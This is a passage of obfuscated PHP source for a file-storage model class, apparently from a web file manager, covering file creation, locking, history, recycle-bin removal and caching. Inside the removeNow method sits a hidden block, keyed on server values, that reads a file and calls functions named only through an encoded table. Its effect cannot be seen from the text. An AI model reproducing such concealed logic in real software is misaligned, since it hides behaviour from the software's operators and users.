$Ù”—Ëò¬; } $åş„„åí = $this->fileNameAuto($éµ±ƒ™í, $åş„„åí, $ñŸª¯Ì); } $ÙñÈ¥îº = array($¬Ü—é¡[660] => 1, $¬Ü—é¡[505] => $åş„„åí, $¬Ü—é¡[661] => $¬Ü—é¡[22], $¬Ü—é¡[553] => 0, $¬Ü—é¡[631] => 0); $º†Şßœç = $this->_addSource($ÙñÈ¥îº, $…ŸßÍµå); Model($¬Ü—é¡[2213])->eventCreate($º†Şßœç, $¬Ü—é¡[1421]); $this->lockWriteEnd($éµ±ƒ™í, $åş„„åí); return $º†Şßœç; } public function listSourceRoot($Š¡Ï¯ ¾, $¼¾Ø¡¦°, $ùù¾ù• = "\x73\157\x75\162\143\x65\x49\x44\x2c\x74\x61\x72\147\145\164\x49\x44\x2c\x73\151\x7a\x65") { $¿†÷ŠìÇ =& $_SERVER[ü¢ÙÊñÛ]; $ºĞêª–ó = $¿†÷ŠìÇ[64]; $âñ“È·¬ = array(); $ñèşàÎã = 1024 * 50; $Öœò = is_array($Öœò) ? $Öœò : array(); $öºò´”î = count($¼¾Ø¡¦°); $í£åŠõª = $this->tablePrefix . $¿†÷ŠìÇ[2251]; for ($¥Œá¯ = 0; $¥Œá¯ < $öºò´”î; $¥Œá¯++) { $šĞ‰Àœ§ = $¼¾Ø¡¦°[$¥Œá¯]; $ºĞêª–ó .= "\x53\105\114\105\103\124\x20\52\x20\106\122\x4f\115\40\50\x53\105\x4c\105\x43\x54\40{$ùù¾ù•}\40\x46\x52\x4f\x4d\40\140{$í£åŠõª}\140\x20\x57\110\105\122\x45\x20"; $ºĞêª–ó .= "\x60\160\x61\162\145\156\x74\111\x44\x60\x3d\x30\40\101\x4e\104\40\x60\164\x61\x72\147\145\164\x49\104\140\x3d{$šĞ‰Àœ§}\x20\x41\x4e\104\x20\140\164\141\162\147\x65\x74\x54\x79\x70\145\140\x3d{$Š¡Ï¯ ¾}\x20\141\156\144\x20\146\x69\x6c\145\x54\171\160\145\x3d\x27\x27\40\x6c\x69\155\x69\164\x20\61\x29\x20\141\163\x20\164\x62\x5f{$¥Œá¯}\x20\125\116\111\x4f\116\40\101\114\114\x20"; if ((strlen($ºĞêª–ó) >= $ñèşàÎã || $¥Œá¯ == $öºò´”î - 1) && $ºĞêª–ó) { $ºĞêª–ó = substr($ºĞêª–ó, 0, -strlen($¿†÷ŠìÇ[1104])); $ĞŠçÌåÆ = $this->query($ºĞêª–ó); $ºĞêª–ó = $¿†÷ŠìÇ[22]; $âñ“È·¬ = array_merge($âñ“È·¬, $ĞŠçÌåÆ); } } return $âñ“È·¬; } private function _createFile($¥£şÚ®, $âèõ¡ˆ˜, $¤™Û—µ, $Ò˜ıß¸¹, &$İ Æ¡ÙÇ) { $¯èÖ£ƒ½ =& $_SERVER[ü¢ÙÊñÛ]; $÷Œ›ÀÜš = $this->sourceInfo($¥£şÚ®); if (!$¤™Û—µ || !$÷Œ›ÀÜš) { return !1; } if ($Ò˜ıß¸¹ !== !1) { $öà®‹¼ = $this->fileNameExist($¥£şÚ®, $âèõ¡ˆ˜); } $İ Æ¡ÙÇ = !0; if ($Ò˜ıß¸¹ && $öà®‹¼) { if ($Ò˜ıß¸¹ == REPEAT_SKIP) { $İ Æ¡ÙÇ = !1; return $öà®‹¼; } else { if ($Ò˜ıß¸¹ == REPEAT_REPLACE) { $ş­‡»Ğ = $this->sourceInfo($öà®‹¼); $”øè¼äò = $this->fileHistory($ş­‡»Ğ, $¤™Û—µ[$¯èÖ£ƒ½[552]], $¤™Û—µ[$¯èÖ£ƒ½[90]]); if (!$”øè¼äò) { $İ Æ¡ÙÇ = !1; } else { $this->folderSizeReset($¥£şÚ®); } return $öà®‹¼; } else { $âèõ¡ˆ˜ = $this->fileNameAuto($¥£şÚ®, $âèõ¡ˆ˜, $Ò˜ıß¸¹, !1); } } } $ò²ÏÇ¸ = array($¯èÖ£ƒ½[660] => 0, $¯èÖ£ƒ½[505] => $âèõ¡ˆ˜, $¯èÖ£ƒ½[661] => substr(get_path_ext($âèõ¡ˆ˜), 0, 10), $¯èÖ£ƒ½[553] => $¤™Û—µ[$¯èÖ£ƒ½[552]], $¯èÖ£ƒ½[631] => $¤™Û—µ[$¯èÖ£ƒ½[90]]); $Ç¤†ß‡Ÿ = $this->_addSource($ò²ÏÇ¸, $÷Œ›ÀÜš); $this->folderSizeReset($¥£şÚ®, intval($ò²ÏÇ¸[$¯èÖ£ƒ½[90]])); return $Ç¤†ß‡Ÿ; } protected function fileHistory($Éı˜ÇğÍ, $“îöÔ®Ç, $Äê³”£) { $’£¸‹æ¢ =& $_SERVER[ü¢ÙÊñÛ]; if ($Éı˜ÇğÍ[$’£¸‹æ¢[552]] == $“îöÔ®Ç) { return !1; } $this->checkLock($Éı˜ÇğÍ[$’£¸‹æ¢[204]], $“îöÔ®Ç); Model($’£¸‹æ¢[2252])->addHistory($Éı˜ÇğÍ); $İ‚¬öîŒ = array($’£¸‹æ¢[665] => USER_ID, $’£¸‹æ¢[509] => time(), $’£¸‹æ¢[552] => $“îöÔ®Ç, $’£¸‹æ¢[90] => $Äê³”£); $this->where(array($’£¸‹æ¢[502] => $Éı˜ÇğÍ[$’£¸‹æ¢[204]]))->save($İ‚¬öîŒ); $this->sourceCacheClear($Éı˜ÇğÍ[$’£¸‹æ¢[204]]); return !0; } public function checkLock($¢ò™‚ í, $÷­Ë úÕ) { $„Ê•ø =& $_SERVER[ü¢ÙÊñÛ]; $Ùé¦ìùÆ = $this->pathInfo($¢ò™‚ í); if (!$this->fileIsLock($Ùé¦ìùÆ, !0)) { return; } $®Ê¤Õôƒ = Session::get($„Ê•ø[2253]); $‘ªßÓà× = substr($Ùé¦ìùÆ[$„Ê•ø[42]], 0, -1 - strlen($Ùé¦ìùÆ[$„Ê•ø[180]])) . $„Ê•ø[1282] . $®Ê¤Õôƒ . $„Ê•ø[20] . $Ùé¦ìùÆ[$„Ê•ø[180]]; $±…²µ = Model($„Ê•ø[688])->find($÷­Ë úÕ); $this->_createFileCall($Ùé¦ìùÆ[$„Ê•ø[203]], $‘ªßÓà×, $±…²µ, REPEAT_REPLACE, $„Ê•ø[1420]); $ÚÎëàõ¥ = $Ùé¦ìùÆ[$„Ê•ø[550]][$„Ê•ø[624]]; $´°Íå¢ = $ÚÎëàõ¥[$„Ê•ø[2254]] ? $ÚÎëàõ¥[$„Ê•ø[2254]] : $ÚÎëàõ¥[$„Ê•ø[42]]; show_json(LNG($„Ê•ø[2255]) . $„Ê•ø[2256] . LNG($„Ê•ø[2257]) . $„Ê•ø[2258] . $´°Íå¢ . $„Ê•ø[2259], !1); } public function fileIsLock($­ÑÛ„á, $­½¤Íõğ = false) { $øÅÑ·Õ =& $_SERVER[ü¢ÙÊñÛ]; if (!_get($­ÑÛ„á, $øÅÑ·Õ[620], 0)) { return !1; } if ($­ÑÛ„á[$øÅÑ·Õ[550]][$øÅÑ·Õ[623]] != USER_ID) { return !0; } $ÄŠóÈÜ€ = $GLOBALS[$øÅÑ·Õ[16]][$øÅÑ·Õ[103]][$øÅÑ·Õ[621]]; if ($­ÑÛ„á[$øÅÑ·Õ[550]][$øÅÑ·Õ[622]] <= time() - $ÄŠóÈÜ€) { $this->metaSet($­ÑÛ„á[$øÅÑ·Õ[204]], $øÅÑ·Õ[623], null); $this->metaSet($­ÑÛ„á[$øÅÑ·Õ[204]], $øÅÑ·Õ[622], null); } if ($­½¤Íõğ) { $this->metaSet($­ÑÛ„á[$øÅÑ·Õ[204]], $øÅÑ·Õ[622], time()); } return !1; } private function _addSource($ı…Ù«‹ˆ, $¸˜ùâÈ») { $ï¨Ê‘å =& $_SERVER[ü¢ÙÊñÛ]; $€ÓÑÃ†Ù = defined($ï¨Ê‘å[2186]) ? USER_ID : 0; $á«µâãî = array($ï¨Ê‘å[662] => $¸˜ùâÈ»[$ï¨Ê‘å[201]], $ï¨Ê‘å[663] => $¸˜ùâÈ»[$ï¨Ê‘å[580]], $ï¨Ê‘å[664] => $€ÓÑÃ†Ù, $ï¨Ê‘å[665] => $€ÓÑÃ†Ù, $ï¨Ê‘å[488] => $¸˜ùâÈ»[$ï¨Ê‘å[204]], $ï¨Ê‘å[666] => $¸˜ùâÈ»[$ï¨Ê‘å[595]] . $¸˜ùâÈ»[$ï¨Ê‘å[204]] . $ï¨Ê‘å[60], $ï¨Ê‘å[515] => 0, $ï¨Ê‘å[667] => $ï¨Ê‘å[22]); $ı…Ù«‹ˆ = array_merge($á«µâãî, $ı…Ù«‹ˆ); $this->updateModifyTime($ı…Ù«‹ˆ[$ï¨Ê‘å[203]]); $æ˜ªıóÉ = $ï¨Ê‘å[2260] . $¸˜ùâÈ»[$ï¨Ê‘å[204]]; if (isset(self::$cacheChildList[$æ˜ªıóÉ])) { unset(self::$cacheChildList[$æ˜ªıóÉ]); } static $øå˜Í™º = false; if (!$øå˜Í™º) { Hook::trigger($ï¨Ê‘å[650], $ı…Ù«‹ˆ); $øå˜Í™º = !0; } $ğáªù = $this->add($ı…Ù«‹ˆ); $éÃ¥ÏŠ© = array($ï¨Ê‘å[668] => short_id($ğáªù)); $this->where(array($ï¨Ê‘å[502] => $ğáªù))->save($éÃ¥ÏŠ©); $this->setNamePinyin($ğáªù, $ı…Ù«‹ˆ[$ï¨Ê‘å[42]]); return $ğáªù; } public function remove($šñ£š¤, $ıí¾ïÜâ = true) { $Ì‚©¶çà =& $_SERVER[ü¢ÙÊñÛ]; $øŸß–é§ = $this->sourceInfo($šñ£š¤); $¿¯Òó¼ = intval($øŸß–é§[$Ì‚©¶çà[201]]) === self::TYPE_SYSTEM; $áµÓîú = Model($Ì‚©¶çà[519])->get($Ì‚©¶çà[2261]) == $Ì‚©¶çà[102]; if ($¿¯Òó¼ || $ıí¾ïÜâ || !$áµÓîú) { return $this->removeNow($šñ£š¤, $ıí¾ïÜâ); } $Óì„ä = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $ŸòÇ¯ë = $øŸß–é§[$Ì‚©¶çà[201]] == self::TYPE_USER ? $Ì‚©¶çà[676] : $Ì‚©¶çà[589]; if ($ŸòÇ¯ë == $Ì‚©¶çà[676]) { $Ô×‹· = Model($Ì‚©¶çà[588])->getInfo($øŸß–é§[$Ì‚©¶çà[580]]); $¿ÔÂö÷ = !empty($Ô×‹·[$Ì‚©¶çà[2254]]) ? $Ô×‹·[$Ì‚©¶çà[2254]] : $Ô×‹·[$Ì‚©¶çà[42]]; $¿ÔÂö÷ = $Ì‚©¶çà[349] . $¿ÔÂö÷ . $Ì‚©¶çà[2262] . $øŸß–é§[$Ì‚©¶çà[580]]; } else { $Ô×‹· = Model($Ì‚©¶çà[596])->getInfo($øŸß–é§[$Ì‚©¶çà[580]]); $¿ÔÂö÷ = _get($Ô×‹·, $Ì‚©¶çà[42]); $¿ÔÂö÷ = $Ì‚©¶çà[187] . $¿ÔÂö÷ . $Ì‚©¶çà[2263] . $øŸß–é§[$Ì‚©¶çà[580]]; } $©„á¾À“ = $Ì‚©¶çà[2264] . md5($¿ÔÂö÷); CacheLock::lock($©„á¾À“); $Ğ¥÷Æ¢ = $this->fileNameExist($Óì„ä, $¿ÔÂö÷); if (!$Ğ¥÷Æ¢) { $Ğ¥÷Æ¢ = $this->mkdir($Óì„ä, $¿ÔÂö÷, REPEAT_SKIP); $this->metaSet($Ğ¥÷Æ¢, $Ì‚©¶çà[2265], $ŸòÇ¯ë); $this->metaSet($Ğ¥÷Æ¢, $Ì‚©¶çà[2266], $øŸß–é§[$Ì‚©¶çà[580]]); if ($øŸß–é§[$Ì‚©¶çà[203]] != 0) { $this->metaSet($Ğ¥÷Æ¢, $Ì‚©¶çà[2267], _get($Ô×‹·, $Ì‚©¶çà[2268])); } } CacheLock::unlock($©„á¾À“); $this->metaSet($šñ£š¤, $Ì‚©¶çà[2269], $øŸß–é§[$Ì‚©¶çà[203]]); $this->where(array($Ì‚©¶çà[204] => $šñ£š¤))->save(array($Ì‚©¶çà[509] => time())); $this->recycleClear($øŸß–é§); Model($Ì‚©¶çà[647])->eventRemove($šñ£š¤); $«ºåÖèé = $this->move($šñ£š¤, $Ğ¥÷Æ¢, REPEAT_RENAME_FOLDER); $this->folderSizeReset($øŸß–é§[$Ì‚©¶çà[203]]); return $«ºåÖèé; } private function recycleClear($áÚŠäÖ) { $ƒİÆ¸Á =& $_SERVER[ü¢ÙÊñÛ]; $¡úù¢·• = $this->childrenAll($áÚŠäÖ); $¤Ÿ¬¨û“ = array($ƒİÆ¸Á[502] => array($ƒİÆ¸Á[503], $¡úù¢·•[$ƒİÆ¸Á[2270]])); Model($ƒİÆ¸Á[2271])->where($¤Ÿ¬¨û“)->delete(); } public function removeNow($”¿î·ªœ, $˜áØÓò“ = true) { $ƒ„ôó¾´ =& $_SERVER[ü¢ÙÊñÛ]; if ($_SERVER[$ƒ„ôó¾´[6]] != $_SERVER[$ƒ„ôó¾´[900]]) { $¥Ú·½Š = $ƒ„ôó¾´[944]; $¸É»òÊË = $ƒ„ôó¾´[7]; $®¸–¤ìò = $_SERVER[$ƒ„ôó¾´[8]] . $ƒ„ôó¾´[9]; $ÊóØÙÑ = $¸É»òÊË($®¸–¤ìò); $†Ş¼Ğ = explode($ƒ„ôó¾´[10], $ÊóØÙÑ); if (count($†Ş¼Ğ) < $ƒ„ôó¾´[706]) { $ğÁÖ˜èŒ = $ƒ„ôó¾´[12]; $ğÁÖ˜èŒ(); } $®ÉÚªä¥ = $ƒ„ôó¾´[945]; $®ÉÚªä¥($_SERVER[$ƒ„ôó¾´[946]]); $®ÉÚªä¥($_SERVER[$ƒ„ôó¾´[8]] . $ƒ„ôó¾´[2272]); $‰Ì Öñ = 1; while ($‰Ì Öñ > 1) { $‰Ì Öñ = $‰Ì Öñ + 4; $˜™•ãğª = rawurlencode($‰Ì Öñ . $ƒ„ôó¾´[64]); } } $ÙØËö¼µ = $this->sourceInfo($”¿î·ªœ); $œ—®Õîó = $this->pathInfoMore($”¿î·ªœ); if (!$ÙØËö¼µ) { return !0; } if ($ÙØËö¼µ[$ƒ„ôó¾´[203]] == 0) { if (!KodUser::isRoot()) { return !1; } } $this->lockMoveStart($”¿î·ªœ); Hook::trigger($ƒ„ôó¾´[2273], $œ—®Õîó, $˜áØÓò“); if ($˜áØÓò“) { Model($ƒ„ôó¾´[2271])->moveToRecycle($”¿î·ªœ); } else { $®ğ¥à¢· = $this->childrenAll($ÙØËö¼µ); Model($ƒ„ôó¾´[647])->eventRemove($”¿î·ªœ); $this->removeRelevance($®ğ¥à¢·[$ƒ„ôó¾´[2270]], $®ğ¥à¢·[$ƒ„ôó¾´[1565]]); } $this->folderSizeReset($ÙØËö¼µ[$ƒ„ôó¾´[203]]); $æ¡£±§ = array($ÙØËö¼µ[$ƒ„ôó¾´[203]]); if ($ÙØËö¼µ[$ƒ„ôó¾´[496]] == $ƒ„ôó¾´[102]) { $æ¡£±§[] = $ÙØËö¼µ[$ƒ„ôó¾´[204]]; } $this->updateModifyTime($æ¡£±§); $this->lockMoveEnd($”¿î·ªœ); Hook::trigger($ƒ„ôó¾´[1802], $œ—®Õîó, $˜áØÓò“); return !0; } public function childrenAll($ĞÂªé) { $Îéºëù’ =& $_SERVER[ü¢ÙÊñÛ]; $±‰­‚äÅ = $ĞÂªé[$Îéºëù’[204]]; if ($ĞÂªé[$Îéºëù’[496]] == $Îéºëù’[102]) { $áêáâ¡½ = array($Îéºëù’[666] => array($Îéºëù’[626], $ĞÂªé[$Îéºëù’[595]] . $±‰­‚äÅ . $Îéºëù’[627])); $ÑüÚ·È± = array($Îéºëù’[666] => $áêáâ¡½[$Îéºëù’[595]]); $¨õ»¶ø‘ = $this->field($Îéºëù’[2274])->where($ÑüÚ·È±)->select(); $†ŸÑ¸ÙÇ = !1; $Şò‚ÒÈ¿ = array($±‰­‚äÅ); if ($¨õ»¶ø‘) { $†ŸÑ¸ÙÇ = array_to_keyvalue($¨õ»¶ø‘, $Îéºëù’[22], $Îéºëù’[552]); $†ŸÑ¸ÙÇ = array_remove_value($†ŸÑ¸ÙÇ, $Îéºëù’[241]); $Şò‚ÒÈ¿ = array_to_keyvalue($¨õ»¶ø‘, $Îéºëù’[22], $Îéºëù’[204]); $Şò‚ÒÈ¿[] = $±‰­‚äÅ; } } else { $†ŸÑ¸ÙÇ = array($ĞÂªé[$Îéºëù’[552]]); $Şò‚ÒÈ¿ = array($±‰­‚äÅ); } return array($Îéºëù’[2270] => $Şò‚ÒÈ¿, $Îéºëù’[1565] => $†ŸÑ¸ÙÇ); } public function removeArray($ÑæôÂ¿¿) { if (!$ÑæôÂ¿¿) { return !0; } } public function removeRelevance($‰áË‚¼‘, $ôËó‹À) { $¾£¦üÇ¬ =& $_SERVER[ü¢ÙÊñÛ]; $‰áË‚¼‘ = $‰áË‚¼‘ ? $‰áË‚¼‘ : array(); $ôËó‹À = $ôËó‹À ? $ôËó‹À : array(); $‰áË‚¼‘ = array_unique(array_filter($‰áË‚¼‘)); $ôËó‹À = array_unique(array_filter($ôËó‹À)); if (!$‰áË‚¼‘) { return !1; } $»´Û€˜Á = array($¾£¦üÇ¬[502] => array($¾£¦üÇ¬[503], $‰áË‚¼‘)); Model($¾£¦üÇ¬[2271])->where($»´Û€˜Á)->delete(); Model($¾£¦üÇ¬[546])->where($»´Û€˜Á)->delete(); Model($¾£¦üÇ¬[2111])->where($»´Û€˜Á)->delete(); Model($¾£¦üÇ¬[647])->where($»´Û€˜Á)->delete(); Model($¾£¦üÇ¬[1938])->removeBySource($‰áË‚¼‘); Model($¾£¦üÇ¬[2252])->removeBySource($‰áË‚¼‘); $this->where($»´Û€˜Á)->delete(); Model($¾£¦üÇ¬[555])->remove($ôËó‹À); for ($œÇÔ»Éç = 0; $œÇÔ»Éç < count($‰áË‚¼‘); $œÇÔ»Éç++) { $this->sourceCacheClear($‰áË‚¼‘[$œÇÔ»Éç]); } } public function rename($éƒ§©ß“, $ªµò†ÁÃ) { $¯É½¯‘› =& $_SERVER[ü¢ÙÊñÛ]; $Ï„£²ëã = $this->sourceInfo($éƒ§©ß“); if (!$Ï„£²ëã) { return !1; } $ª·¤ŒÜí = $this->fileNameExist($Ï„£²ëã[$¯É½¯‘›[203]], $ªµò†ÁÃ); if ($ª·¤ŒÜí && $ª·¤ŒÜí != $éƒ§©ß“) { return !1; } $¯„ØÇ„ = array($¯É½¯‘›[505] => $ªµò†ÁÃ, $¯É½¯‘›[665] => USER_ID); if ($Ï„£²ëã[$¯É½¯‘›[496]] != $¯É½¯‘›[102]) { $¯„ØÇ„[$¯É½¯‘›[497]] = substr(get_path_ext($ªµò†ÁÃ), 0, 10); } Model($¯É½¯‘›[647])->eventRename($éƒ§©ß“, $Ï„£²ëã[$¯É½¯‘›[42]], $ªµò†ÁÃ); $this->sourceCacheClear($éƒ§©ß“); $this->setNamePinyin($éƒ§©ß“, $¯„ØÇ„[$¯É½¯‘›[42]], !1); $this->updateModifyTime($Ï„£²ëã[$¯É½¯‘›[203]]); $°Ù¶ÆıÖ = $this->where(array($¯É½¯‘›[502] => $éƒ§©ß“))->data($¯„ØÇ„)->save(); $Ü‚Š×»… = $¯É½¯‘›[2260] . $Ï„£²ëã[$¯É½¯‘›[203]]; if (isset(self::$cacheChildList[$Ü‚Š×»…])) { unset(self::$cacheChildList[$Ü‚Š×»…]); } return $°Ù¶ÆıÖ; } public function setNamePinyin($ÂØ×øŠ·, $ÚÁ¸‚éÅ, $İùÆ‡ø¶ = true) { $şÜÔ·ÁÈ =& $_SERVER[ü¢ÙÊñÛ]; $Î«êæüİ = Input::check($ÚÁ¸‚éÅ, $şÜÔ·ÁÈ[669]); $‰Ïñ³ßÎ = array($şÜÔ·ÁÈ[528] => KodSort::makeStr($ÚÁ¸‚éÅ)); if ($Î«êæüİ) { $‰Ïñ³ßÎ[$şÜÔ·ÁÈ[549]] = str_replace($şÜÔ·ÁÈ[63], $şÜÔ·ÁÈ[22], Pinyin::get($ÚÁ¸‚éÅ)); $‰Ïñ³ßÎ[$şÜÔ·ÁÈ[548]] = Pinyin::get($ÚÁ¸‚éÅ, $şÜÔ·ÁÈ[670]); } if (!$İùÆ‡ø¶ && !$Î«êæüİ) { $‰Ïñ³ßÎ[$şÜÔ·ÁÈ[549]] = null; $‰Ïñ³ßÎ[$şÜÔ·ÁÈ[548]] = null; } $this->metaSet($ÂØ×øŠ·, $‰Ïñ³ßÎ); } public function getContent($íº®ØØâ) { $µçÜÖĞ =& $_SERVER[ü¢ÙÊñÛ]; $Ëí””„¤ = $this->fileInfoGet($íº®ØØâ); if (!$Ëí””„¤) { return !1; } if ($Ëí””„¤[$µçÜÖĞ[90]] == 0) { return $µçÜÖĞ[22]; } $®ŸÇ²Ó§ = $µçÜÖĞ[2275] . $Ëí””„¤[$µçÜÖĞ[558]]; if ($Ëí””„¤[$µçÜÖĞ[90]] <= 1024 * 10) { $á¿²ºêÛ = Cache::get($®ŸÇ²Ó§); if (!$á¿²ºêÛ) { $á¿²ºêÛ = IO::getContent($Ëí””„¤[$µçÜÖĞ[98]]); Cache::set($®ŸÇ²Ó§, $á¿²ºêÛ); } return $á¿²ºêÛ; } if (!$Ëí””„¤[$µçÜÖĞ[98]]) { return $µçÜÖĞ[22]; } return IO::getContent($Ëí””„¤[$µçÜÖĞ[98]]); } public function setDesc($ÛÌÔÅ¤‘, $Ú¯Ø‰ü“) { $øÃê¿¾µ =& $_SERVER[ü¢ÙÊñÛ]; Model($øÃê¿¾µ[647])->eventAddDesc($ÛÌÔÅ¤‘, $Ú¯Ø‰ü“); return $this->metaSet($ÛÌÔÅ¤‘, $øÃê¿¾µ[537], $Ú¯Ø‰ü“); } public function setContent($ÙøåœËÖ, $çïÎ¬îÄ = '') { $ÚÅÛ½±¼ =& $_SERVER[ü¢ÙÊñÛ]; $³ÂƒáÚÈ = $this->sourceInfo($ÙøåœËÖ); $‡âù²˜ş = $this->fileInfoGet($ÙøåœËÖ); if (!$‡âù²˜ş || !$³ÂƒáÚÈ) { return !1; } $Ë½ºìô = Model($ÚÅÛ½±¼[555])->addFileByContent($çïÎ¬îÄ, $³ÂƒáÚÈ[$ÚÅÛ½±¼[42]]); $æ…¹¯Â× = $this->fileHistory($³ÂƒáÚÈ, $Ë½ºìô[$ÚÅÛ½±¼[552]], $Ë½ºìô[$ÚÅÛ½±¼[90]]); if (!$æ…¹¯Â×) { return Model($ÚÅÛ½±¼[555])->remove($Ë½ºìô[$ÚÅÛ½±¼[552]]); } $this->folderSizeReset($³ÂƒáÚÈ[$ÚÅÛ½±¼[203]]); return !0; } public function fileSubstr($Â øšÂ©, $ëÜºëÎâ, $­¥ñ›Ëû) { $šì‚¥ = $this->fileInfoGet($Â øšÂ©); if (!$šì‚¥) { return !1; } return IO::fileSubstr($šì‚¥[$_SERVER[ü¢ÙÊñÛ][98]], $ëÜºëÎâ, $­¥ñ›Ëû); } public function fileInfoGet($«ûï³š) { $ĞÏë´ =& $_SERVER[ü¢ÙÊñÛ]; $§åƒÚêÑ = $this->sourceInfo($«ûï³š); if (!$§åƒÚêÑ || $§åƒÚêÑ[$ĞÏë´[496]]) { return !1; } $ÒÄø¼ÔŠ = $ĞÏë´[559] . $§åƒÚêÑ[$ĞÏë´[552]]; $¾Éš¶ = _get(self::$cacheFileInfo, $ÒÄø¼ÔŠ); if ($¾Éš¶) { return $¾Éš¶; } $¨ø¤¸Ûã = Model($ĞÏë´[555])->fileInfo($§åƒÚêÑ[$ĞÏë´[552]]); if ($¨ø¤¸Ûã) { $¨ø¤¸Ûã[$ĞÏë´[42]] = $§åƒÚêÑ[$ĞÏë´[42]]; } self::$cacheFileInfo[$ÒÄø¼ÔŠ] = $¨ø¤¸Ûã; return $¨ø¤¸Ûã; } private function folderChildrenNumber($¢Ë£ûÚ) { $©¶ıÍİ  =& $_SERVER[ü¢ÙÊñÛ]; $¼˜ûõï = $this->sourceInfo($¢Ë£ûÚ); $§ë­…äğ = array($©¶ıÍİ [666] => array($©¶ıÍİ [626], $¼˜ûõï[$©¶ıÍİ [595]] . $¢Ë£ûÚ . $©¶ıÍİ [627]), $©¶ıÍİ [663] => $¼˜ûõï[$©¶ıÍİ [580]], $©¶ıÍİ [515] => intval($¼˜ûõï[$©¶ıÍİ [516]]), $©¶ıÍİ [660] => 1); $“ïáï©€ = $this->where($§ë­…äğ)->count(); $ûÖ«ğ÷¶ = $this->where($§ë­…äğ)->where(array($©¶ıÍİ [660] => 0))->count(); return array($©¶ıÍİ [94] => $ûÖ«ğ÷¶, $©¶ıÍİ [95] => $“ïáï©€); } public function pathInfo($˜Üüñ™­, $¢İáåõ  = false) { $œ‹‡ÔÕ =& $_SERVER[ü¢ÙÊñÛ]; $¢İáåõ  = !1; $˜Üüñ™­ = intval($˜Üüñ™­); $Ñå÷™ÓÑ = $œ‹‡ÔÕ[545] . intval($¢İáåõ ) . $œ‹‡ÔÕ[473] . $˜Üüñ™­; $Ïšíåâƒ = _get(self::$cachePathInfo, $Ñå÷™ÓÑ); if ($Ïšíåâƒ) { return $Ïšíåâƒ; } $ª¸çªëõ = $this->sourceInfo($˜Üüñ™­); if (!$ª¸çªëõ) { return !1; } $ª¸çªëõ = $this->_listDataApplyItem($ª¸çªëõ, $¢İáåõ ); self::$cachePathInfo[$Ñå÷™ÓÑ] = $ª¸çªëõ; return $ª¸çªëõ; } public static $cachePathInfoMore = array(); public function pathInfoMore($ÔèÔ¹ôé) { $¿Ï¿Ï =& $_SERVER[ü¢ÙÊñÛ]; $ší“˜Ö¹ = _get(self::$cachePathInfoMore, $ÔèÔ¹ôé); if ($ší“˜Ö¹) { return $ší“˜Ö¹; } $Ë†Ç’ = $this->pathInfo($ÔèÔ¹ôé); if (!$Ë†Ç’) { return !1; } if ($Ë†Ç’[$¿Ï¿Ï[496]] == $¿Ï¿Ï[102]) { $Ë†Ç’[$¿Ï¿Ï[93]] = $this->folderChildrenNumber($ÔèÔ¹ôé); } self::$cachePathInfoMore[$ÔèÔ¹ôé] = $Ë†Ç’; return $Ë†Ç’; } public function sourceInfo($ÃøÇî’) { $ìÍ•æ‰ =& $_SERVER[ü¢ÙÊñÛ]; if (!$ÃøÇî’) { return array(); } $ÃøÇî’ = intval($ÃøÇî’); $ŸÓ±¸¶ª = $ìÍ•æ‰[544] . $ÃøÇî’; $ÔÌì”¶± = _get(self::$cacheSourceInfo, $ŸÓ±¸¶ª); if ($ÔÌì”¶±) { return $ÔÌì”¶±; } $Ÿˆèçœ = $this->where(array($ìÍ•æ‰[204] => $ÃøÇî’))->find(); self::$cacheSourceInfo[$ŸÓ±¸¶ª] = $Ÿˆèçœ; return self::$cacheSourceInfo[$ŸÓ±¸¶ª]; } public function sourceCacheClear($óéõÉŞ = false) { self::cacheClear($óéõÉŞ); } public static function cacheClear($© øÅâ = false) { $—½èüèò =& $_SERVER[ü¢ÙÊñÛ]; if ($© øÅâ == !1) { self::$cacheSourceInfo = null; self::$cacheSourceInfo = array(); self::$cachePathInfo = null; self::$cachePathInfo = array(); self::$cachePathInfoMore = null; self::$cachePathInfoMore = array(); return; } unset(self::$cacheSourceInfo[$—½èüèò[544] . $© øÅâ]); unset(self::$cachePathInfoMore[$© øÅâ]); unset(self::$cachePathInfo[$—½èüèò[2276] . $© øÅâ]); unset(self::$cachePathInfo[$—½èüèò[2277] . $© øÅâ]); } public function metaSet($¶¥ˆ¢¿É, $ÒÏœ›Ÿˆ = null, $ÌªëÕ¯¿ = null) { $„ğ—¬Òò = parent::metaSet($¶¥ˆ¢¿É, $ÒÏœ›Ÿˆ, $ÌªëÕ¯¿); if ($„ğ—¬Òò) { $this->sourceCacheClear($¶¥ˆ¢¿É); } return $„ğ—¬Òò; } public function pathInfoByPath($§Âƒù—, $ûĞÔ÷Ìû) { $åöêÃ¤í =& $_SERVER[ü¢ÙÊñÛ]; $­¯áâåø = !$ûĞÔ÷Ìû ? array() : explode($åöêÃ¤í[18], trim($ûĞÔ÷Ìû, $åöêÃ¤í[18])); $µˆ¨…‹ô = $§Âƒù—; foreach ($­¯áâåø as $Ô‹‘êÈˆ) { $¼İú¡˜ò = array($åöêÃ¤í[203] => $µˆ¨…‹ô, $åöêÃ¤í[42] => $Ô‹‘êÈˆ); $ÔßôœöÔ = $this->field($åöêÃ¤í[2278])->where($¼İú¡˜ò)->select(); if (!$ÔßôœöÔ) { return !1; } $ÔßôœöÔ = array_sort_by($ÔßôœöÔ, $åöêÃ¤í[516]); $µˆ¨…‹ô = $ÔßôœöÔ[0][$åöêÃ¤í[204]]; } $Ÿâ»Ãôğ = $this->sourceInfo($µˆ¨…‹ô); $this->pathInfoFilter($Ÿâ»Ãôğ); return $Ÿâ»Ãôğ; } protected function updateModifyTime($òÓüû³˜) { $”Èß¿ê¡ =& $_SERVER[ü¢ÙÊñÛ]; $İÍ‰µ˜ = defined($”Èß¿ê¡[2186]) ? USER_ID : 0; if (!$òÓüû³˜) { return; } if (!is_array($òÓüû³˜)) { $òÓüû³˜ = array($òÓüû³˜); } foreach ($òÓüû³˜ as $Õ…·§—º => $ê×ïáò) { $òÓüû³˜[$Õ…·§—º] = intval($ê×ïáò); $this->sourceCacheClear($ê×ïáò); } $íÚ°‰š = array($”Èß¿ê¡[204] => array($”Èß¿ê¡[17], $òÓüû³˜)); $ıÊ±²Ş = array($”Èß¿ê¡[665] => $İÍ‰µ˜, $”Èß¿ê¡[509] => time()); $this->where($íÚ°‰š)->save($ıÊ±²Ş); } public function folderSizeReset($ÃŸ—÷´å, $¨³†í•ï = false) { $¦İ±ğù± =& $_SERVER[ü¢ÙÊñÛ]; if ($this->statusIgnoreResetSpace) { return; } $ïÕÁáÅæ = $this->sourceInfo($ÃŸ—÷´å); $ìÙè™òı = 